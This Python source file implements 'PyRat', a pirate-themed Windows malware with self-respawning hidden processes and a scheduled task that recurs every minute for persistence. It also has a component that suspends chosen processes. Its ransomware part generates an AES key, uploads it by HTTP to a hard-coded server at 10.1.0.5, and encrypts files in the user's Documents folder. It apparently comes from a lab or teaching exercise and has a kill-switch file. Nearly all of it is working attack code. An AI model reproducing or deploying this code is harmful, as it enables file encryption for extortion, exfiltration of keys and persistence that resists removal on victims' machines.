import os
import sys
import time
import json
import socket
import ctypes
import psutil
import struct
import select
import base64
import signal
import subprocess
import requests
import hashlib
import random
from Crypto import Random
from Crypto.Cipher import AES
from datetime import datetime
from io import StringIO
from abc import ABC, abstractmethod

ANY                 = "0.0.0.0"
LOCALHOST           = "localhost"
SOMAXCONN           = 128

PYRAT_TYPE_INDEX    = 1

STDOUT              = 0

def str2bool(string):
	if string == "True":
		return True
	else:
		return False

def log(text, file_path='log.txt'):
	with open(file_path, 'a+') as file_handler:
		file_handler.write(f'{datetime.now().time()}: {str(text)}\n')

class PyRatError(Exception):
	pass

class PyRat(ABC):
	PYRAT_CODE                  = os.path.abspath(__file__)
	CREATION_FLAGS              = subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
	DEFAULT_CONFIG_FILE         = "config.json"

	SEND_RECV_DELAY             = 0.001
	CAPTAIN_PORT                = 0x4261 # ARG!

	def sail(self):
		try:
			self.operate()
		except KeyboardInterrupt:
			pass

		self.leave()

	@abstractmethod
	def operate(self):
		pass
	
	@abstractmethod
	def leave(self):
		pass

	def getConfiguration(self):
		configuration_data = self.getConfigurationData()

		json_io = StringIO(configuration_data.decode("utf-8"))
		return json.load(json_io)

	def getConfigurationData(self):
		try:
			with open(self.DEFAULT_CONFIG_FILE, "rb") as configuration_file:
				return configuration_file.read()

		except FileNotFoundError:
			return b""

	def challengeResponse(self, connection):
		sent_chal, recv_chal = self.sendAndRecvChallenge(connection)
		sent_resp, recv_resp = self.sendAndRecvResponse(connection, recv_chal)

		if not self.checkChallengeResponse(sent_chal, recv_resp):
			return False

		return True

	def sendAndRecvChallenge(self, connection):
		CHALLENGE = b"Arrrrg?"

		connection.send(CHALLENGE)
		time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
		other_challenge = connection.recv(len(CHALLENGE))

		return (CHALLENGE, other_challenge)

	def sendAndRecvResponse(self, connection, received_challenge):
		RESPONSE = b"Arrrrg!"

		connection.send(RESPONSE)
		time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
		other_response = connection.recv(len(RESPONSE))

		return (RESPONSE, other_response)

	def checkChallengeResponse(self, challenge, response):
		if response == b"Arrrrg!":
			return True

		return False

	def sendAndRecvPid(self, connection):
		connection.send(struct.pack(">L", os.getpid()))
		time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
		raw_pid = connection.recv(len(struct.pack(">L", 0)))
		return struct.unpack(">L", raw_pid)[0]

class Captain(PyRat):
	def __init__(self):
		self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection_socket.bind((ANY, self.CAPTAIN_PORT))
		self.connection_socket.listen(SOMAXCONN)

	def operate(self):
		configuration_data = self.getConfigurationData()

		while True:
			quartermaster_socket, quartermaster_address = self.connection_socket.accept()
			print(f"Got a new quartermaster: {quartermaster_address}")

			if self.challengeResponse(quartermaster_socket):
				quartermaster_socket.send(configuration_data)
				quartermaster_socket.close()

	def leave(self):
		self.connection_socket.close()

class Quartermaster(PyRat):
	QUARTERMASTER_EXE_PATH          = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Quartermaster.exe")
	STORM_PATH                      = os.path.dirname(PyRat.PYRAT_CODE) + "\\storm"
	CAPTAIN_IP                      = "127.0.0.1"
	BLOCK_SIZE                      = 1024

	@staticmethod
	def generateInstance(challenges_socket = None):
		# ctypes.windll.user32.MessageBoxW(0, "Generating quartermaster", "DEBUG", 0)
		if challenges_socket is None:
			return psutil.Popen(
				[Quartermaster.QUARTERMASTER_EXE_PATH, PyRat.PYRAT_CODE, Quartermaster.__name__, "False"], 
				creationflags=PyRat.CREATION_FLAGS,
				close_fds = True)
		
		quatermaster = psutil.Popen(
			[Quartermaster.QUARTERMASTER_EXE_PATH, PyRat.PYRAT_CODE, Quartermaster.__name__, "True"], 
			stdin=subprocess.PIPE, 
			creationflags=PyRat.CREATION_FLAGS,
			close_fds = True)

		try:
			shared_challenges_socket = challenges_socket.share(quatermaster.pid)
			quatermaster.communicate(input=base64.b64encode(shared_challenges_socket), timeout=0)

		except subprocess.TimeoutExpired:
			pass

		return quatermaster

	def __init__(self, is_challenges_socket_in_input = "False"):
		self.new_configuration = False
		self.configuration = self.getConfiguration()

		self.challenges_socket = self.getChallengesSocket(str2bool(is_challenges_socket_in_input))
		if self.challenges_socket is None:
			exit(1)

		self.challenges_socket.setblocking(0)
		self.mates_pids = set()
		self.surgeon_pid = None
		
		print(f"A new quartermaster has been appointed! ({os.getpid()})")

	def operate(self):
		if self.isThereAStorm():
			# ctypes.windll.user32.MessageBoxW(0, "Storm Detected", "DEBUG", 0)
			return

		# ctypes.windll.user32.MessageBoxW(0, str(self.configuration["NEW_QUARTERMASTER_MATES"]), "DEBUG", 0)
		self.appointNewMates(self.configuration["NEW_QUARTERMASTER_MATES"])
		self.surgeon_pid = self.appointSurgeon(Surgeon.MODE_REMOVE)
		self.ransomrat_pid = self.appointRansomRat()

		iteration = 0

		while not self.isThereAStorm():
			current_pids = psutil.pids()
			self.watchMates(current_pids)
			self.watchBoatswains()
			self.watchSurgeon(current_pids)
			self.watchRansomRat(current_pids)
			self.acceptChallengingMates()

			time.sleep(self.configuration["ITERATION_DELAY"])

	def leave(self):
		self.dismissCrew()

		if self.challenges_socket is not None:
			self.challenges_socket.close()

		print(f"The quartermaster has left the ship. ({os.getpid()})")

	def getConfigurationData(self):
		last_configuration_data = PyRat.getConfigurationData(self)

		try:
			configuration_data = self.getConfigurationFromCaptain()

			if configuration_data != last_configuration_data:
				self.saveConfiguration(configuration_data)
				self.new_configuration = True

		except (socket.timeout, ConnectionRefusedError, PyRatError):
			configuration_data = last_configuration_data

		return configuration_data

	def getConfigurationFromCaptain(self):
		configuration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		configuration_socket.settimeout(0.1) # To make the connection failure faster
		configuration_socket.connect((self.CAPTAIN_IP, self.CAPTAIN_PORT))

		if not self.challengeResponse(configuration_socket):
			raise PyRatError("The captain doesn't seem to respond well to the challenge")

		last_configuration_length = 0
		configuration_data = configuration_socket.recv(self.BLOCK_SIZE)
		while last_configuration_length != len(configuration_data):
			last_configuration_length = len(configuration_data)
			configuration_data += configuration_socket.recv(self.BLOCK_SIZE)

		return configuration_data

	def saveConfiguration(self, configuration_data):
		with open(self.DEFAULT_CONFIG_FILE, "wb") as configuration_file:
			configuration_file.write(configuration_data)

	def getChallengesSocket(self, is_challenges_socket_in_input = False):
		try:
			if not is_challenges_socket_in_input:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.bind((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))
				sock.listen(SOMAXCONN)
				return sock

		except Exception:
			return None

		challenges_socket_base64 = input()
		shared_challenges_socket = base64.b64decode(challenges_socket_base64)
		return socket.fromshare(shared_challenges_socket)

	def acceptChallengingMates(self):
		try:
			while True:
				# Will raise BlockingIOError if none waiting
				new_connection, _ = self.challenges_socket.accept()

				# Check if the one that was connected is a Mate
				if not self.challengeResponse(new_connection):
					new_connection.close()
					continue

				mate_pid = self.sendAndRecvPid(new_connection)
				new_connection.close()

				if self.new_configuration:
					# Resetting the mate so it will get the new configuration
					self.sendLeaveCommand(mate_pid)
					self.appointNewMates(1)

				else:
					self.mates_pids.add(mate_pid)

		except BlockingIOError:
			pass

	def watchMates(self, current_pids):
		mates_died = self.mates_pids - self.mates_pids.intersection(current_pids)
		
		for pid in mates_died:
			print(f"A mate has died! ({pid})")
			self.mates_pids.remove(pid)
		
		if mates_died:
			self.appointNewMates(self.configuration["DEAD_MATE_MATES"] * len(mates_died))

	def appointNewMates(self, number_of_new_mates):
		for i in range(number_of_new_mates):
			# ctypes.windll.user32.MessageBoxW(0, f"Mate {i} created", "DEBUG", 0)
			new_mate = Mate.generateInstance(os.getpid())
			self.mates_pids.add(new_mate.pid)

	def watchBoatswains(self):
		if not self.isScheduleBoatswainExists():
			self.appointScheduleBoatswain()

	def isScheduleBoatswainExists(self):
		check_if_schedule_boatswain_exists_command = \
			f'schtasks /Query /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" 2> nul'

		is_schedule_boatswain_exists = subprocess.Popen(check_if_schedule_boatswain_exists_command, 
														shell=True, 
														stdout=subprocess.PIPE).communicate()[STDOUT]
		return bool(is_schedule_boatswain_exists)

	def appointScheduleBoatswain(self):
		create_schedule_boatswain_task_command = \
			f'schtasks /Create /F /SC MINUTE /MO 1 /NP /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" /TR "{self.QUARTERMASTER_EXE_PATH} {PyRat.PYRAT_CODE}" >nul 2>nul'
		subprocess.Popen(create_schedule_boatswain_task_command, shell=True)

		print(f'A schedule boatswain has been appointed! (Scheduled task {self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]})')

	def watchSurgeon(self, current_pids):
		if self.surgeon_pid not in current_pids:
			print(f"The surgeon has died! ({self.surgeon_pid})")
			self.surgeon_pid = self.appointSurgeon(Surgeon.MODE_REMOVE)

	def watchRansomRat(self, current_pids):
		if self.ransomrat_pid not in current_pids:
			print(f"The RansomRat has died! ({self.ransomrat_pid})")
			self.ransomrat_pid = self.appointRansomRat()

	def appointSurgeon(self, surgeon_mode):
		return Surgeon.generateInstance(os.getpid(), surgeon_mode).pid

	def appointRansomRat(self):
		return RansomRat.generateInstance(os.getpid()).pid

	def isThereAStorm(self):
		if os.path.exists(self.STORM_PATH):
			print(f"Detected a storm... Today we shall not sail...")
			return True

		return False

	def dismissCrew(self):
		self.dismissBoatswains()
		self.dismissAllMates()
		self.dismissSurgeon()

	def dismissAllMates(self):
		for pid in self.mates_pids:
			self.sendLeaveCommand(pid)

	def dismissBoatswains(self):
		self.dismissScheduleBoatswain()

	def dismissScheduleBoatswain(self):
		delete_schedule_boatswain_task_command = \
			f'schtasks /Delete /F /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" >nul 2>nul'

		subprocess.Popen(delete_schedule_boatswain_task_command, shell=True)
		print(f'A schedule boatswain has left the ship. (Scheduled task {self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]})')

	def dismissSurgeon(self):
		# Closing the surgeon and reattaching all the suspended processes by appointing a reattaching surgeon.
		self.sendLeaveCommand(self.surgeon_pid)
		self.appointSurgeon(Surgeon.MODE_REATTACH)

	def sendLeaveCommand(self, pid):
		try:
			os.kill(pid, signal.SIGINT)

		except (PermissionError, OSError):
			print("Permission error")
			pass

class Mate(PyRat):
	MATE_EXE_PATH               = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Mate.exe")

	@staticmethod
	def generateInstance(quartermaster_pid = None):
		if quartermaster_pid is not None:
			return psutil.Popen(
				[Mate.MATE_EXE_PATH, PyRat.PYRAT_CODE, Mate.__name__, str(quartermaster_pid)], 
				creationflags=PyRat.CREATION_FLAGS,
				close_fds = True)
		else:
			return psutil.Popen(
				[Mate.MATE_EXE_PATH, PyRat.PYRAT_CODE, Mate.__name__], 
				creationflags=PyRat.CREATION_FLAGS,
				close_fds = True)

	def __init__(self, quartermaster_pid = None):
		self.configuration = self.getConfiguration()

		if quartermaster_pid is not None:
			self.quartermaster_pid = int(quartermaster_pid)
		else:
			self.quartermaster_pid = self.getQuartermasterPid()

		print(f"A new mate has joined the team! ({os.getpid()})")

	def operate(self):
		while True:
			if self.quartermaster_pid not in psutil.pids():
				self.tryToAppointNewQuartermaster()

			time.sleep(self.configuration["ITERATION_DELAY"])

	def leave(self):
		print(f"A mate has left the ship. ({os.getpid()})")

	def tryToAppointNewQuartermaster(self):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			sock.bind((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))

		except OSError:
			# There is another quartermaster. Becoming quartermaster failed!
			sock.close()
			self.quartermaster_pid = self.getQuartermasterPid()
			return

		# Only one Mate will be able to reach this line (we use the bind as a mutex).
		print(f"The quartermaster has died! ({self.quartermaster_pid})")
		sock.listen(SOMAXCONN)
		Quartermaster.generateInstance(sock)
		sock.close()

		self.quartermaster_pid = self.getQuartermasterPid()

	def getQuartermasterPid(self):
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
			try:
				connection.connect((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))

			except ConnectionRefusedError:
				raise PyRatError("There is no quartermaster!")

			if not self.challengeResponse(connection):
				# The port is taken but it is not a quartermaster on the other side...
				raise PyRatError("A non quartermaster has taken the port!")

			return self.sendAndRecvPid(connection)

class Surgeon(PyRat):
	SURGEON_EXE_PATH    = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Surgeon.exe")
	BAD_PROCESS_NAMES   = ["notepad.exe"]
	SUSPENDED           = "stopped"

	MODE_REMOVE         = "remove"
	MODE_REATTACH       = "reattach"

	@staticmethod
	def generateInstance(quartermaster_pid, mode):
		return psutil.Popen(
			[Surgeon.SURGEON_EXE_PATH, PyRat.PYRAT_CODE, Surgeon.__name__, str(quartermaster_pid), mode], 
			creationflags=PyRat.CREATION_FLAGS,
			close_fds = True)

	def __init__(self, quartermaster_pid, mode):
		self.configuration = self.getConfiguration()

		if mode not in [self.MODE_REMOVE, self.MODE_REATTACH]:
			raise PyRatError("Not a valid surgeon mode")

		self.quartermaster_pid = int(quartermaster_pid)
		self.mode = mode
		self.start_time = time.time()

		print(f"A new surgeon has joined the team! ({os.getpid()})")

	def operate(self):
		if self.mode == self.MODE_REMOVE:
			while self.quartermaster_pid in psutil.pids():
				self.removeLimbs()
				time.sleep(self.configuration["ITERATION_DELAY"])
		
		elif self.mode == self.MODE_REATTACH:
			self.reattachLimbs()

	def leave(self):
		print(f"The surgeon has left the ship. ({os.getpid()})")

	def removeLimbs(self):
		for process in psutil.process_iter():
			if process.name() in self.configuration["BAD_PROCESSES_NAMES"] and \
			   process.create_time() > self.start_time and \
			   process.status() != self.SUSPENDED:

				process.suspend()

	def reattachLimbs(self):
		for process in psutil.process_iter():
			if process.name() in self.configuration["BAD_PROCESSES_NAMES"] and \
			   process.status() == self.SUSPENDED:
			   
				process.resume()

class RansomRat(PyRat):
	RANSOMRAT_EXE_PATH = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "RansomRat.exe")
	SERVER_IP = '10.1.0.5'
	SERVER_PORT = '8000'
	API_PREFIX = f'http://{SERVER_IP}:{SERVER_PORT}'
	UPLOAD_API = f'{API_PREFIX}/upload'
	FOLDER_TO_DECRYPT = f'{os.environ["USERPROFILE"]}\\Documents\\encrypt'


	@staticmethod
	def generateInstance(quartermaster_pid):
		return psutil.Popen(
			[RansomRat.RANSOMRAT_EXE_PATH, PyRat.PYRAT_CODE, RansomRat.__name__, str(quartermaster_pid)], 
			creationflags=PyRat.CREATION_FLAGS,
			close_fds = True)

	def __init__(self, quartermaster_pid):
		self.configuration = self.getConfiguration()

		self.quartermaster_pid = int(quartermaster_pid)

		self.key = RansomRat.generate_aes_key()
		self.upload_key()

		self.aes = AESCipher(self.key)

		print(f"A new surgeon has joined the team! ({os.getpid()})")

	def operate(self):
		files_to_encrypt = [os.path.join(path, name) for path, subdirs, files in os.walk(RansomRat.FOLDER_TO_DECRYPT) for name in files]

		while self.quartermaster_pid in psutil.pids():
			if files_to_encrypt:
				current_file = random.choice(files_to_encrypt)
				files_to_encrypt.remove(current_file)
				log(current_file)
				with open(current_file, 'rb') as file_handler:
					unencrypted = file_handler.read()
				encrypted = self.aes.encrypt(str(unencrypted))

				with open(current_file, 'wb') as file_handler:
					file_handler.write(bytes(encrypted))

			time.sleep(self.configuration["ENCRYPTION_DELAY"])
		
	def leave(self):
		print(f"The RansomRat has left the ship. ({os.getpid()})")

	def upload_key(self):
		key_file_path = f'C:\\windows\\temp\\{os.environ["COMPUTERNAME"]}_key'
		with open(key_file_path, 'wb') as file_handler:
			file_handler.write(self.key)

		key_file_handle = open(key_file_path, 'rb')
		files = {'upload': key_file_handle}
		cookies = {'login': 'ZWR3YXJk'}

		try:
			resp = requests.post(RansomRat.UPLOAD_API, files=files, cookies=cookies)
			if 'An error has occured. Error: File exists.' in resp.text:
				self.key = self.generate_fallback_aes_key()
				log(self.key)
			server_up = resp.status_code == 200
		except Exception as e:
			log(e)
			server_up = False

		key_file_handle.close()
		os.remove(key_file_path)

		return server_up

	@staticmethod
	def generate_aes_key():
		return os.urandom(16)

	@staticmethod
	def generate_fallback_aes_key():
		return hashlib.sha1().hexdigest()[:16].encode('utf8')

class AESCipher(object):

    def __init__(self, key): 
        self.bs = AES.block_size
        self.key = key

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

def main(argv):
	if len(argv) <= PYRAT_TYPE_INDEX:
		# This is the main run. We want to create a Quartermaster and exit.
		print(Quartermaster.generateInstance())
		return

	try:
		# ctypes.windll.user32.MessageBoxW(0, "something created", "DEBUG", 0)
		# Generating the wanted PyRat
		pyrat = globals()[argv[PYRAT_TYPE_INDEX]](*argv[PYRAT_TYPE_INDEX + 1 :])
		pyrat.sail()

	except KeyboardInterrupt:
		pass

	except Exception as e:
		ctypes.windll.user32.MessageBoxW(0, "An unexpected exception was raised:\n{}".format(e), "A PyRat fell", 0)

if __name__ == "__main__":
	main(sys.argv)
